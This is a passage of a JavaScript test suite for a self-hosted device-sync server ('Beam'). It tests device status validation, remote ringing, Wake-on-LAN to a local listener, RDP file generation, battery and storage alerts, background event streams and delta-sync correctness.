    assert.ok(ev.events.some(e => e.event === 'devices' && e.data.devices.some(x => x.id === 'gamingpc001' && x.status)));
    assert.doesNotMatch(JSON.stringify(ev.events), macRe, 'event stream');
    assert.match(s.out, /Gaming PC reports its status: Windows 11 Pro 24H2; battery 80% \(charging\);/);
    // validation
    for (const bad of [
      { nope: 1 }, { battery: { level: 150, charging: false } }, { battery: { level: 50, charging: 'yes' } }, { battery: { level: 50, extra: 1 } },
      { storage: { free: 10, total: 5 } }, { storage: { free: -1, total: 5 } }, { os: 'x'.repeat(61) }, { os: '' },
      { macs: ['not a mac'] }, { macs: ['ff:ff:ff:ff:ff:ff'] }, { macs: ['01:00:5e:00:00:01'] }, { macs: Array(9).fill(MAC1) }, { remoteDesktop: 'on' },
      { update: 'failed' }, { update: { version: 'soon', problem: 'x' } }, { update: { version: '1.6.3', problem: ' ' } },
      { update: { version: '1.6.3', problem: 'p'.repeat(301) } }, { update: { version: '1.6.3', problem: 'p', extra: 1 } },
    ]) {
      assert.equal((await put(bad)).status, 400, JSON.stringify(bad));
    }
    assert.equal((await s.req('PUT', '/api/devices/me/status', { headers: json({ Authorization: `Bearer ${K}` }), body: '{}' })).status, 400, 'needs a device id');
    // (1.6.2) An app update that didn't install: in the log once (again only if it changes), in the device list, gone
    // once that version runs there.
    const problem = 'Android blocked the update (INSTALL_FAILED_VERIFICATION_FAILURE: ‮unverified).';
    for (let i = 0; i < 2; i++) assert.equal((await put({ update: { version: '1.6.3', problem } })).status, 204);
    assert.equal((s.out.match(/Gaming PC couldn't install Beam 1\.6\.3: Android blocked the update \(INSTALL_FAILED_VERIFICATION_FAILURE: unverified\)\./g) || []).length, 1, 'logged once, without direction marks');
    const pcNow = async () => (await s.req('GET', '/api/devices', { headers: phone })).json.devices.find(x => x.id === 'gamingpc001');
    assert.deepEqual((await pcNow()).status.update, { version: '1.6.3', problem: 'Android blocked the update (INSTALL_FAILED_VERIFICATION_FAILURE: unverified).' });
    await s.req('GET', '/api/me', { headers: { ...pc, 'X-Beam-App-Version': '1.6.2' } });
    assert.ok((await pcNow()).status.update, 'still there while an older version runs');
    await s.req('GET', '/api/me', { headers: { ...pc, 'X-Beam-App-Version': '1.6.3' } });
    assert.equal((await pcNow()).status.update, undefined, 'gone once 1.6.3 runs');
    ev.close();
  } finally { await s.stop(); await ts.close(); }
});

test('QW-B: ring reaches every client, only for devices that can ring', async () => {
  const s = await startServer('qw-ring', 8791);
  try {
    const K = s.key;
    const desk = app(K, 'desktop0001', 'Desktop', 'windows', from('100.64.60.1'));
    const phone = app(K, 'phone000001', 'Robin Phone', 'android', { ...from('100.64.60.2'), 'X-Beam-App-Version': '1.3.0' });
    await s.req('GET', '/api/me', { headers: desk });
    const ev = await openEvents(s.port, phone);
    await ev.wait('hello');
    let r = await s.req('POST', '/api/devices/phone000001/ring', { headers: desk });
    assert.equal(r.status, 202);
    assert.equal(r.json.online, true);
    const ring = await ev.wait('ring', d => d.device === 'phone000001' && !d.stop);
    assert.equal(ring.data.by, 'Desktop');
    assert.ok(ring.data.at > 0);
    r = await post(s, '/api/devices/phone000001/ring', { stop: true }, desk);
    assert.equal(r.status, 202);
    await ev.wait('ring', d => d.device === 'phone000001' && d.stop === true);
    assert.match(s.out, /Desktop rang Robin Phone/);
    assert.match(s.out, /Desktop stopped Robin Phone ringing/);
    assert.equal((await s.req('POST', '/api/devices/nosuchdevice1/ring', { headers: desk })).status, 404);
    assert.equal((await post(s, '/api/devices/phone000001/ring', { loud: true }, desk)).status, 400);
    await s.req('GET', '/api/me', { headers: { ...cookie(K, 'webonly0001', { 'X-Beam-Platform': 'web' }), ...from('100.64.60.9') } });
    assert.equal((await s.req('POST', '/api/devices/webonly0001/ring', { headers: desk })).status, 409, 'a browser can’t ring');
    // Ringing needs the 1.3 apps: an unknown or older version can't ring (it would ignore the event)
    let machine = 0; // each on its own machine, so the reinstall rule doesn't merge them
    const ringable = async (id, version) => {
      await s.req('GET', '/api/me', { headers: app(K, id, id, 'android', { ...from(`100.64.61.${++machine}`), ...(version && { 'X-Beam-App-Version': version }) }) });
      return (await s.req('GET', '/api/devices', { headers: desk })).json.devices.find(d => d.id === id).can.ring;
    };
    assert.equal(await ringable('noversion01'), false, 'unknown version');
    assert.equal(await ringable('oldphone001', '1.2.1'), false, '1.2.1');
    assert.equal(await ringable('newphone001', '1.10.0'), true, '1.10.0 (compared as numbers)');
    assert.equal(await ringable('betaphone01', '1.3.0-beta'), true, '1.3.0-beta');
    const refused = await s.req('POST', '/api/devices/oldphone001/ring', { headers: desk });
    assert.equal(refused.status, 409);
    assert.match(refused.json.error, /needs the Beam app 1\.3\.0 or later/);
    ev.close();
    await sleep(300);
    r = await s.req('POST', '/api/devices/phone000001/ring', { headers: desk });
    assert.equal(r.json.online, false);
  } finally { await s.stop(); }
});

test('QW-C: Wake-on-LAN sends magic packets for every adapter (to a test listener) and never reveals the MACs', async () => {
  const dgram = require('node:dgram');
  const listener = dgram.createSocket('udp4');
  const packets = [];
  listener.on('message', msg => packets.push(msg));
  await new Promise(r => listener.bind(8798, '127.0.0.1', r));
  const s = await startServer('qw-wake', 8791, { env: { BEAM_WOL_TARGETS: '127.0.0.1:8798' } });
  try {
    const K = s.key;
    const pc = app(K, 'officepc001', 'Office PC', 'windows');
    const phone = app(K, 'phone000001', 'Pixel', 'android', from('100.64.70.2'));
    await s.req('GET', '/api/me', { headers: phone });
    await s.req('GET', '/api/me', { headers: pc });
    let r = await s.req('POST', '/api/devices/officepc001/wake', { headers: phone });
    assert.equal(r.status, 409, 'no adapters known yet');
    await s.req('PUT', '/api/devices/me/status', { headers: json(pc), body: JSON.stringify({ macs: [MAC1, MAC2] }) });
    r = await s.req('POST', '/api/devices/officepc001/wake', { headers: phone });
    assert.equal(r.status, 200, r.body);
    assert.deepEqual(r.json, { sent: 6, macs: 2 }, 'two adapters × one target × three rounds');
    assert.doesNotMatch(r.body, /0a:1b/i);
    await waitFor(() => packets.length >= 6);
    const expect = mac => Buffer.concat([Buffer.alloc(6, 0xff), ...Array(16).fill(Buffer.from(mac.split(/[:-]/).map(h => parseInt(h, 16))))]);
    assert.ok(packets.some(p => p.equals(expect(MAC1))) && packets.some(p => p.equals(expect(MAC2))), 'real magic packets');
    assert.match(s.out, /sent Wake-on-LAN to Office PC \(2 network adapters, 6 packets\)/);
    assert.equal((await s.req('POST', '/api/devices/nosuchdevice1/wake', { headers: phone })).status, 404);
  } finally { await s.stop(); await new Promise(r => listener.close(r)); }
});

test('QW-D: a Remote Desktop file for a Windows PC with a Tailscale address', async () => {
  const ts = await fakeTailscale({ peers: [
    { name: 'work-pc', ips: ['100.64.80.1', 'fd7a:115c:a1e0::80:1'], dns: 'work-pc.tail1234.ts.net.' },
    { name: 'nodns', ips: ['100.64.80.3'], dns: '' },
  ] });
  const s = await startServer('qw-rdp', 8791, { env: { BEAM_TAILSCALE: '', BEAM_TAILSCALE_SOCKET: ts.socket } });
  try {
    const K = s.key;
    const pc = app(K, 'workpc00001', 'Work PC', 'windows', from('100.64.80.1'));
    const other = app(K, 'nodnspc0001', 'No DNS PC', 'windows', from('100.64.80.3'));
    const lan = app(K, 'lanpc000001', 'LAN PC', 'windows', from('192.168.1.20'));
    for (const h of [pc, other, lan]) await s.req('PUT', '/api/devices/me/status', { headers: json(h), body: JSON.stringify({ remoteDesktop: true }) });
    let r = await s.req('GET', '/api/devices/workpc00001/remote-desktop.rdp', { headers: app(K, 'phone000001', 'Pixel', 'android') });
    assert.equal(r.status, 200);
    assert.equal(r.headers['content-type'], 'application/x-rdp');
    assert.match(r.headers['content-disposition'], /attachment; filename="Work PC\.rdp"/);
    assert.equal(r.body, 'full address:s:work-pc.tail1234.ts.net\r\nprompt for credentials:i:1\r\nscreen mode id:i:2\r\n');
    r = await s.req('GET', '/api/devices/nodnspc0001/remote-desktop.rdp', { headers: app(K, 'phone000001') });
    assert.match(r.body, /^full address:s:100\.64\.80\.3\r\n/, 'falls back to the Tailscale address');
    assert.equal((await s.req('GET', '/api/devices/lanpc000001/remote-desktop.rdp', { headers: app(K, 'phone000001') })).status, 404, 'no address known');
    const devs = (await s.req('GET', '/api/devices', { headers: app(K, 'phone000001') })).json.devices;
    assert.equal(devs.find(d => d.id === 'workpc00001').can.remoteDesktop, true);
    assert.equal(devs.find(d => d.id === 'lanpc000001').can.remoteDesktop, false);
  } finally { await s.stop(); await ts.close(); }
});

test('QW-E: battery and storage alerts fire once and re-arm; settings; alerts.json; ntfy', async () => {
  const pushed = [];
  const ntfy = http.createServer((req, res) => {
    let body = '';
    req.on('data', d => { body += d; });
    req.on('end', () => { pushed.push(JSON.parse(body)); res.end('{}'); });
  });
  await new Promise(r => ntfy.listen(8797, '127.0.0.1', r));
  const roomy = `${500 * 1024 ** 3},${1000 * 1024 ** 3}`; // no server-disk alert, whatever the real disk holds
  const s = await startServer('qw-alerts', 8791, { env: { BEAM_NTFY: 'http://127.0.0.1:8797/beam-test-topic', BEAM_TEST_DISK: roomy } });
  try {
    const K = s.key;
    const phone = app(K, 'phone000001', 'Robin Phone', 'android', from('100.64.90.2'));
    const desk = app(K, 'desktop0001', 'Desktop', 'windows', from('100.64.90.1'));
    await s.req('GET', '/api/me', { headers: desk });
    const ev = await openEvents(s.port, desk);
    await ev.wait('hello');
    const status = body => s.req('PUT', '/api/devices/me/status', { headers: json(phone), body: JSON.stringify(body) });
    const count = kind => ev.events.filter(e => e.event === 'alert' && e.data.kind === kind).length;
    await status({ battery: { level: 40, charging: false } });
    await status({ battery: { level: 15, charging: false } });
    const first = await ev.wait('alert', d => d.kind === 'battery');
    assert.equal(first.data.device, 'phone000001');
    assert.equal(first.data.level, 'warn');
    assert.match(first.data.text, /Robin Phone's battery is at 15%/);
    await status({ battery: { level: 12, charging: false } });
    await status({ battery: { level: 20, charging: false } });
    await sleep(200);
    assert.equal(count('battery'), 1, 'once until it recovers');
    await status({ battery: { level: 20, charging: true } }); // charging re-arms
    await status({ battery: { level: 10, charging: false } });
    await waitFor(() => count('battery') === 2);
    // storage: under max(2 GB, 5 %) once; more than that + 20 % re-arms
    const GB = 1024 ** 3;
    await status({ storage: { free: 1.5 * GB, total: 32 * GB } });
    await ev.wait('alert', d => d.kind === 'storage' && /running out of storage/.test(d.text));
    await status({ storage: { free: 2.2 * GB, total: 32 * GB } });
    await status({ storage: { free: 1.9 * GB, total: 32 * GB } });
    await sleep(200);
    assert.equal(count('storage'), 1);
    await status({ storage: { free: 3 * GB, total: 32 * GB } });
    await status({ storage: { free: 1 * GB, total: 32 * GB } });
    await waitFor(() => count('storage') === 2);
    // listed, saved, pushed
    const listed = (await s.req('GET', '/api/alerts', { headers: desk })).json.alerts;
    assert.equal(listed.length, 4);
    assert.equal(listed[0].kind, 'storage', 'newest first');
    await waitFor(() => pushed.length >= 4);
    assert.equal(pushed[0].topic, 'beam-test-topic');
    assert.match(pushed.map(p => p.message).join('\n'), /Robin Phone's battery is at 15%/);
    await sleep(300);
    assert.equal(JSON.parse(fs.readFileSync(path.join(s.data, 'alerts.json'), 'utf8')).length, 4);
    // settings
    let r = await s.req('GET', '/api/settings', { headers: desk });
    assert.deepEqual(r.json.alerts, { battery: true, storage: true, serverDisk: true, offline: [] });
    r = await s.req('PATCH', '/api/settings', { headers: json(desk), body: JSON.stringify({ alerts: { battery: false } }) });
    assert.equal(r.status, 200);
    assert.deepEqual(r.json.alerts, { battery: false, storage: true, serverDisk: true, offline: [] }, 'partial changes keep the rest');
    for (const bad of [{ alerts: { battery: 'no' } }, { alerts: { nope: true } }, { alerts: { offline: 'phone' } }, { alerts: [] }]) {
      assert.equal((await s.req('PATCH', '/api/settings', { headers: json(desk), body: JSON.stringify(bad) })).status, 400, JSON.stringify(bad));
    }
    await status({ battery: { level: 60, charging: false } });
    await status({ battery: { level: 5, charging: false } });
    await sleep(300);
    assert.equal(count('battery'), 2, 'turned off: no alert');
    assert.match(s.out, /Robin Phone's battery is at 5%/, 'but the crossing is still logged');
    ev.close();
  } finally { await s.stop(); await new Promise(r => ntfy.close(r)); }
});

test('QW-E: offline and back-online alerts for watched devices; the server disk alert', async () => {
  const s = await startServer('qw-offline', 8791, { env: { BEAM_TEST_DISK: `${2 * 1024 ** 3},${100 * 1024 ** 3}` } });
  try {
    const K = s.key;
    const desk = app(K, 'desktop0001', 'Desktop', 'windows', from('100.64.91.1'));
    const laptop = app(K, 'laptop00001', 'Laptop', 'windows', from('100.64.91.3'));
    await s.req('GET', '/api/me', { headers: laptop });
    const ev = await openEvents(s.port, desk);
    await ev.wait('hello');
    // The first check runs 200 ms after start, maybe before this stream connected, so read the saved list
    const diskAlerts = async () => (await s.req('GET', '/api/alerts', { headers: desk })).json.alerts.filter(a => a.kind === 'serverDisk');
    const [disk] = await waitFor(async () => { const found = await diskAlerts(); return found.length && found; }, 5000);
    assert.equal(disk.device, null);
    assert.match(disk.text, /almost full: 2\.0 GB free/);
    await sleep(1500);
    assert.equal((await diskAlerts()).length, 1, 'at most every 12 hours');
    let r = await s.req('PATCH', '/api/settings', { headers: json(desk), body: JSON.stringify({ alerts: { offline: ['laptop00001'] } }) });
    assert.deepEqual(r.json.alerts.offline, ['laptop00001']);
    const lap = await openEvents(s.port, laptop);
    await lap.wait('hello');
    await sleep(200);
    lap.close();
    const off = await ev.wait('alert', d => d.kind === 'offline' && d.device === 'laptop00001', 6000);
    assert.equal(off.data.level, 'warn');
    assert.match(off.data.text, /Laptop has been offline for/);
    const back = await openEvents(s.port, laptop);
    await back.wait('hello');
    const on = await ev.wait('alert', d => d.kind === 'online' && d.device === 'laptop00001', 6000);
    assert.equal(on.data.level, 'info');
    assert.match(on.data.text, /Laptop is back online/);
    // a short drop is not reported
    back.close();
    const again = await openEvents(s.port, laptop);
    await again.wait('hello');
    await sleep(2000);
    assert.equal(ev.events.filter(e => e.event === 'alert' && e.data.kind === 'offline').length, 1);
    again.close();
    ev.close();
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- 1.4 protocol additions (plan/speed.md P1–P6)

// A GET that keeps what arrived even when the server cuts the response off.
function streamGet(port, route, headers = {}) {
  return new Promise((resolve, reject) => {
    const r = http.request({ host: '127.0.0.1', port, path: route, headers, agent: false }, res => {
      const out = { status: res.statusCode, headers: res.headers, chunks: [], bytes: 0 };
      res.on('data', c => { out.chunks.push(c); out.bytes += c.length; });
      out.done = new Promise(done => res.on('close', () => done({ body: Buffer.concat(out.chunks), complete: res.complete })));
      res.on('error', () => {});
      out.abort = () => r.destroy();
      resolve(out);
    });
    r.on('error', e => (e.code === 'ECONNRESET' ? null : reject(e)));
    r.end();
  });
}

const eventIndex = (ev, name, pred = () => true) => ev.events.findIndex(e => e.event === name && pred(e.data));

test('P1: background streams get urgent events at once and hold the rest (coalesced) until the heartbeat', async () => {
  const s = await startServer('p1', 8791);
  try {
    const K = s.key;
    const v13 = { 'X-Beam-App-Version': '1.3.0' };
    // Each on its own machine: two Android apps on one machine would count as a reinstall and be merged.
    const desk = app(K, 'p1desk00001', 'Desk', 'windows', from('100.64.81.1'));
    const phone = app(K, 'p1phone0001', 'Phone', 'android', { ...v13, ...from('100.64.81.2') });
    const other = app(K, 'p1other0001', 'Other', 'android', { ...v13, ...from('100.64.81.3') });
    await s.req('GET', '/api/me', { headers: other });
    // Heartbeats run 25× faster in tests: ping=60 is 2.4 s.
    const bg = await openEvents(s.port, phone, '/api/events?mode=background&ping=60');
    const hello = (await bg.wait('hello')).data;
    assert.equal(hello.mode, 'background');
    assert.equal(hello.ping, 60);
    assert.match(hello.stream, /^[\w-]{12}$/);
    assert.ok(hello.features.includes('stream-modes') && hello.features.includes('items-since'), 'hello lists the features');
    const fg = await openEvents(s.port, desk);
    assert.deepEqual([(await fg.wait('hello')).data.mode, (await fg.wait('hello')).data.ping], ['foreground', 25]);
    const clamped = await openEvents(s.port, other, '/api/events?mode=background&ping=5');
    assert.equal((await clamped.wait('hello')).data.ping, 15, 'ping is clamped to 15–300 s');
    clamped.close();
    await sleep(500);

    // Not for the phone: held (the foreground stream has it at once).
    const notMine = await sendText(s, desk, 'for the other one', ['p1other0001']);
    await fg.wait('item', d => d.id === notMine.id, 1000);
    await s.req('PATCH', `/api/items/${notMine.id}`, { headers: json(desk), body: JSON.stringify({ pinned: true }) });
    await s.req('PATCH', `/api/items/${notMine.id}`, { headers: json(desk), body: JSON.stringify({ pinned: false }) });
    await fg.wait('update', d => d.id === notMine.id && d.pinned === false, 1000);
    await s.req('POST', '/api/devices/p1other0001/ring', { headers: json(desk), body: '{}' }); // a ring for another device
    await sleep(300);
    assert.equal(eventIndex(bg, 'item', d => d.id === notMine.id), -1, 'held');
    assert.equal(eventIndex(bg, 'ring'), -1, 'held');

    // For the phone: at once, after the held ones (order kept, updates coalesced to the latest).
    const mine = await sendText(s, desk, 'for the phone', ['p1phone0001']);
    await bg.wait('item', d => d.id === mine.id, 1000);
    const held = eventIndex(bg, 'item', d => d.id === notMine.id);
    const update = eventIndex(bg, 'update', d => d.id === notMine.id);
    assert.ok(held >= 0 && held < update && update < eventIndex(bg, 'item', d => d.id === mine.id), 'held events first, in order');
    assert.equal(bg.events.filter(e => e.event === 'update' && e.data.id === notMine.id).length, 1, 'coalesced');
    assert.equal(bg.events.find(e => e.event === 'update' && e.data.id === notMine.id).data.pinned, false, 'the latest state');
    assert.ok(eventIndex(bg, 'ring', d => d.device === 'p1other0001') >= 0);

    // Other urgent kinds: a ring for it, an alert about another device, the first event of an upload for it.
    await s.req('POST', '/api/devices/p1phone0001/ring', { headers: json(desk), body: '{}' });
    await bg.wait('ring', d => d.device === 'p1phone0001', 1000);
    await s.req('PUT', '/api/devices/me/status', { headers: json(desk), body: JSON.stringify({ battery: { level: 5, charging: false } }) });
    await bg.wait('alert', d => d.device === 'p1desk00001', 1000);
    const up = await post(s, '/api/uploads', { name: 'small.bin', size: 1000, to: ['p1phone0001'] }, desk);
    await bg.wait('upload', d => d.id === up.json.id && d.offset === 0, 1000);
    const toAll = await post(s, '/api/uploads', { name: 'all.bin', size: 1000 }, desk);
    await bg.wait('upload', d => d.id === toAll.json.id, 1000); // `to` empty: for everyone
    const toOther = await post(s, '/api/uploads', { name: 'other.bin', size: 1000, to: ['p1other0001'] }, desk);
    const fromPhone = await post(s, '/api/uploads', { name: 'mine.bin', size: 1000 }, phone);
    await s.req('PUT', `/api/uploads/${up.json.id}?offset=0`, { headers: desk, body: Buffer.alloc(400) }); // progress
    await sleep(300);
    assert.equal(eventIndex(bg, 'upload', d => d.id === toOther.json.id), -1, 'an upload for another device is held');
    assert.equal(eventIndex(bg, 'upload', d => d.id === fromPhone.json.id), -1, 'so is its own upload');
    assert.equal(eventIndex(bg, 'upload', d => d.id === up.json.id && d.offset > 0), -1, 'and progress');

    // The heartbeat: the held events go out instead of a ping.
    const pingsBefore = bg.events.filter(e => e.event === 'ping').length;
    await bg.wait('upload', d => d.id === toOther.json.id, 4000);
    assert.equal(bg.events.filter(e => e.event === 'ping').length, pingsBefore, 'data counts as the heartbeat');
    await bg.wait('ping', () => true, 4000); // nothing held any more: a plain ping next time
    for (const id of [toOther, toAll, fromPhone, up].map(r => r.json.id)) await s.req('DELETE', `/api/uploads/${id}`, { headers: desk });

    // A queue past 100 events goes out early (an urgent item empties the queue first).
    const flush = await sendText(s, desk, 'empties the queue', ['p1phone0001']);
    await bg.wait('item', d => d.id === flush.id, 1000);
    const reads = () => bg.events.filter(e => e.event === 'read').length;
    const before = reads();
    for (let i = 0; i < 101; i++) await s.req('PUT', '/api/read', { headers: json(desk), body: JSON.stringify({ conversation: 'p1other0001', ts: 1000 + i }) });
    await waitFor(() => reads() - before >= 101, 1500);
    bg.close();
    fg.close();
  } finally { await s.stop(); }
});

test('P1: poke flushes a stream, switches its mode or heartbeat, and says when to reconnect', async () => {
  const s = await startServer('p1poke', 8791);
  try {
    const K = s.key;
    const desk = app(K, 'pokedesk001', 'Desk', 'windows');
    const phone = app(K, 'pokephone01', 'Phone', 'android');
    await s.req('GET', '/api/me', { headers: desk });
    const bg = await openEvents(s.port, phone, '/api/events?mode=background');
    const { stream, ping } = (await bg.wait('hello')).data;
    assert.equal(ping, 180);
    await sleep(400);
    const held = await sendText(s, phone, 'from the phone itself');
    await sleep(300);
    assert.equal(eventIndex(bg, 'item', d => d.id === held.id), -1, 'its own item is not urgent');
    let r = await post(s, '/api/events/poke', { stream }, phone);
    assert.deepEqual(r.json, { alive: true, mode: 'background', ping: 180 });
    await bg.wait('ping', d => d.poke === true, 1000);
    assert.ok(eventIndex(bg, 'item', d => d.id === held.id) < eventIndex(bg, 'ping', d => d.poke === true), 'held events first, then the poke ping');
    // On screen: foreground without reconnecting.
    r = await post(s, '/api/events/poke', { stream, mode: 'foreground' }, phone);
    assert.deepEqual(r.json, { alive: true, mode: 'foreground', ping: 25 });
    const now = await sendText(s, phone, 'shown at once now');
    await bg.wait('item', d => d.id === now.id, 1000);
    r = await post(s, '/api/events/poke', { stream, mode: 'background', ping: 1000 }, phone);
    assert.deepEqual(r.json, { alive: true, mode: 'background', ping: 300 });
    // Someone else's stream, an unknown one, bad requests.
    assert.deepEqual((await post(s, '/api/events/poke', { stream }, desk)).json, { alive: false });
    assert.deepEqual((await post(s, '/api/events/poke', { stream: 'nosuchstream' }, phone)).json, { alive: false });
    assert.equal((await post(s, '/api/events/poke', {}, phone)).status, 400);
    assert.equal((await post(s, '/api/events/poke', { stream, mode: 'sideways' }, phone)).status, 400);
    assert.equal((await post(s, '/api/events/poke', { stream, extra: 1 }, phone)).status, 400);
    bg.close();
    await sleep(200);
    assert.deepEqual((await post(s, '/api/events/poke', { stream }, phone)).json, { alive: false }, 'a closed stream');
    // Old clients (no mode) are unchanged: foreground, pings every 25 s.
    const old = await openEvents(s.port, desk);
    const h = (await old.wait('hello')).data;
    assert.equal(h.mode, 'foreground');
    await old.wait('ping', () => true, 2000);
    old.close();
  } finally { await s.stop(); }
});

// Applies a delta to a list the way clients do: drop the deleted ids, replace or add the changed items.
function applyDelta(list, delta) {
  const map = new Map(list.map(i => [i.id, i]));
  for (const id of delta.deleted) map.delete(id);
  for (const i of delta.items) map.set(i.id, i);
  return [...map.values()];
}
const byId = list => [...list].sort((a, b) => (a.id < b.id ? -1 : 1));

test('P2: delta sync is exact: random changes by several devices, checked from random old cursors (property test)', async () => {
  let s = await startServer('p2', 8791, { env: { BEAM_MAX_ITEMS: '30' } });
  try {
    const K = s.key;
    const ids = ['p2dev000001', 'p2dev000002', 'p2dev000003', 'p2dev000004'];
    const devs = ids.map((id, i) => app(K, id, `Dev ${i}`, i % 2 ? 'android' : 'windows', from(`100.64.82.${i + 1}`)));
    for (const h of devs) await s.req('GET', '/api/me', { headers: h });
    let seed = 20260930;
    const rand = n => { seed = (seed * 1103515245 + 12345) % 2147483648; return Math.floor((seed / 2147483648) * n); };
    const pick = list => list[rand(list.length)];
    const list = async h => (await s.req('GET', '/api/items', { headers: h || pick(devs) })).json;
    const snapshots = [];
    let checks = 0;
    const check = async () => {
      const now = await list();
      assert.ok(now.items.every((it, i) => i === 0 || now.items[i - 1].ts >= it.ts), 'newest first');
      for (const snap of snapshots) {
        const d = (await s.req('GET', `/api/items?since=${encodeURIComponent(snap.cursor)}`, { headers: pick(devs) })).json;
        assert.equal(d.delta, true, 'answered exactly');
        assert.equal(d.cursor, now.cursor);
        assert.deepEqual(byId(applyDelta(snap.items, d)), byId(now.items), `delta from ${snap.cursor}`);
        const order = now.items.map(i => i.id).filter(id => d.items.some(x => x.id === id));
        assert.deepEqual(d.items.map(i => i.id), order, 'delta items newest first');
        checks++;
      }
    };
    const current = () => list(devs[0]).then(r => r.items);
    const ops = [
      async h => sendText(s, h, `short ${rand(1e6)}`, rand(2) ? [pick(ids)] : undefined),
      async h => sendText(s, h, 'long '.repeat(3500 + rand(2000))), // over 16 KB: truncated in lists
      async h => sendText(s, h, 'x'.repeat(70_000 + rand(1000))), // over 64 KB: kept in data/texts
      async h => upload(s, h, `f${rand(1e6)}.jpg`, crypto.randomBytes(100 + rand(5000)), { to: rand(2) ? [pick(ids)] : [] }),
      async h => s.req('PUT', `/api/file?name=p${rand(1e6)}.txt`, { headers: h, body: 'plain' }),
      async h => { const it = pick(await current()); if (it) await post(s, `/api/items/${it.id}/forward`, {}, h); },
      async h => { const it = pick(await current()); if (it) await s.req('POST', `/api/items/${it.id}/ack`, { headers: h }); },
      async h => { const it = pick(await current()); if (it) await s.req('POST', `/api/items/${it.id}/ack`, { headers: h }); },
      async h => { const it = pick(await current()); if (it) await s.req('PATCH', `/api/items/${it.id}`, { headers: json(h), body: JSON.stringify({ pinned: rand(2) === 1 }) }); },
      async h => {
        const it = pick((await current()).filter(i => i.mime === 'image/jpeg'));
        if (it) await s.req('PUT', `/api/items/${it.id}/thumb`, { headers: { ...h, 'Content-Type': 'image/jpeg' }, body: Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), crypto.randomBytes(200)]) });
      },
      async h => { const it = pick(await current()); if (it) await s.req('DELETE', `/api/items/${it.id}`, { headers: h }); },
      async h => { const some = (await current()).filter(() => rand(3) === 0).map(i => i.id); await post(s, '/api/items/delete', { ids: some }, h); },
    ];
    for (let step = 0; step < 240; step++) {
      await ops[rand(ops.length)](pick(devs));
      if (step === 170) await s.req('DELETE', '/api/items', { headers: pick(devs) }); // everything at once
      if (rand(8) === 0) {
        const snap = await list();
        snapshots.push({ cursor: snap.cursor, items: snap.items });
        if (snapshots.length > 6) snapshots.splice(rand(snapshots.length - 1), 1);
      }
      if (step % 20 === 19) await check();
    }
    await check();
    assert.ok(checks >= 40, `checked ${checks} deltas`);

    // What was saved is what was served (items.json is written from cached per-item JSON): stop cleanly, start again.
    const served = (await list(devs[0])).items;
    await s.req('POST', '/api/admin/shutdown', { headers: { Authorization: `Bearer ${K}` } });
    await s.exited;
    s = await startServer('p2', 8791, { keep: true, env: { BEAM_MAX_ITEMS: '30' } });
    assert.deepEqual(byId((await list(devs[0])).items), byId(served), 'the same list after a restart');

    // No change: an empty delta with the same cursor.
    const snap = await list();
    const same = (await s.req('GET', `/api/items?since=${snap.cursor}`, { headers: devs[0] })).json;
    assert.deepEqual(same, { items: [], deleted: [], cursor: snap.cursor, delta: true });
    // Cursors it can't answer exactly get the full list.
    for (const bad of ['nonsense', '000000000000.1', `${snap.cursor.split('.')[0]}.999999999`, '']) {
      const r = (await s.req('GET', `/api/items?since=${encodeURIComponent(bad)}`, { headers: devs[0] })).json;
      assert.equal(r.delta, false, bad);
      assert.deepEqual(byId(r.items), byId(snap.items));
    }
    // A device merge rewrites items: older cursors get the full list.
    await s.req('GET', '/api/me', { headers: app(K, 'p2web000001', 'Web', 'web', from('100.64.77.7')) });
    await sendText(s, devs[0], 'to the browser', ['p2web000001']);
    await s.req('GET', '/api/me', { headers: app(K, 'p2app000001', 'App', 'windows', from('100.64.77.7')) });
    const merged = (await s.req('GET', `/api/items?since=${snap.cursor}`, { headers: devs[0] })).json;
    assert.equal(merged.delta, false, 'a merge since the cursor');
    assert.ok(merged.items.some(i => i.to.includes('p2app000001')));
    const after = (await s.req('GET', `/api/items?since=${merged.cursor}`, { headers: devs[0] })).json;
    assert.equal(after.delta, true, 'a cursor from after the merge is fine');
  } finally { await s.stop(); }
});

test('Store: a burst of changes is saved together; creates and deletions are on disk before their answer', async () => {
  const s = await startServer('store', 8791);
  try {
    const h = app(s.key, 'storedev001', 'Dev', 'windows');
    const b = app(s.key, 'storedev002', 'Other', 'android', from('100.64.83.2'));
    await s.req('GET', '/api/me', { headers: b });
    const file = path.join(s.data, 'items.json');
    const first = await sendText(s, h, 'on disk before the 201');
    assert.match(fs.readFileSync(file, 'utf8'), /on disk before the 201/);
    const ids = [];
    for (let i = 0; i < 10; i++) ids.push((await sendText(s, h, `burst ${i}`)).id);
    await sleep(300);
    const writes = async () => (await s.req('GET', '/api/metrics', { headers: h })).json.store.files['items.json'].writes;
    const w0 = await writes();
    await Promise.all(ids.map(id => s.req('POST', `/api/items/${id}/ack`, { headers: b })));
    for (const id of ids) await s.req('PATCH', `/api/items/${id}`, { headers: json(h), body: JSON.stringify({ pinned: true }) });
    await sleep(400);
    const w1 = await writes();
    assert.ok(w1 - w0 <= 3, `20 changes saved in ${w1 - w0} writes`);
    const onDisk = JSON.parse(fs.readFileSync(file, 'utf8'));
    for (const id of ids) {
      const it = onDisk.find(i => i.id === id);
      assert.ok(it.pinned && it.delivered.storedev002, 'every change made it');
    }
    assert.equal((await s.req('DELETE', `/api/items/${first.id}`, { headers: h })).status, 204);
    assert.doesNotMatch(fs.readFileSync(file, 'utf8'), /on disk before the 201/, 'deleted on disk before the 204');
  } finally { await s.stop(); }
});

test('P2: cursors belong to one server process: after a restart the full list comes back', async () => {
  let s = await startServer('p2restart', 8791);
  const h = app(s.key, 'p2rdev00001', 'Dev', 'android');
  await sendText(s, h, 'one');
  const { cursor } = (await s.req('GET', '/api/items', { headers: h })).json;
  await sleep(300);
  await s.stop();
  s = await startServer('p2restart', 8791, { keep: true });
  try {
    const r = (await s.req('GET', `/api/items?since=${cursor}`, { headers: h })).json;
    assert.equal(r.delta, false);
    assert.equal(r.items.length, 1);
    assert.notEqual(r.cursor, cursor);
  } finally { await s.stop(); }
});

test('P3: JSON over 1 KB is gzipped when asked; static files get brotli and immutable versioned URLs', async () => {
  const s = await startServer('p3', 8791);
  try {
    const h = app(s.key, 'p3dev000001', 'Dev', 'android');
    for (let i = 0; i < 20; i++) await sendText(s, h, `text number ${i} `.repeat(20));
    const plain = await s.req('GET', '/api/items', { headers: h, raw: true });
    assert.equal(plain.headers['content-encoding'], undefined);
    assert.equal(Number(plain.headers['content-length']), plain.body.length, 'JSON has a Content-Length');
